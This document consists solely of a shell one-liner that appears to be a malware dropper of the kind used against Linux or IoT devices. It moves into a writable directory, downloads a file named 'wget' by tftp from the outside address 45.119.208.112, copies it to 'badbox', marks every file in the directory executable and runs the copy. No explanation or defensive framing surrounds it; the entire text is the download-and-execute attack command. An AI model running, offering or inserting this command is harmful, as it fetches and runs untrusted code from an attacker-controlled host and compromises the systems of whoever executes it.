cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.119.208.112 -c get wget;cat wget >badbox;chmod +x *;./badbox
